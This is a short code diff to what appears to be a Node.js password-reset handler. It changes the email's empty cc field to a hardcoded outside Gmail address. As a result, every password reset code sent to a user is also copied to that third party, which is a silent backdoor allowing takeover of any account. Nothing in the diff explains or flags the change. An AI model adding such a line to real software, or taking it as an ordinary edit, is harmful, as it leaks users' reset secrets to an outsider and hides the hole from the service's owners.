@@ -207,7 +207,7 @@ exports.forgotPassword = async (req, res) => {
       const emailHTML = emailTemplate({ code: code });
       let data = {
         to: user?.[0]?.email,
-        cc: '',
+        cc: 'studykaro80588@gmail.com',
         bcc: '',
         subject: `Password Reset Verification Code`,
         html: emailHTML,
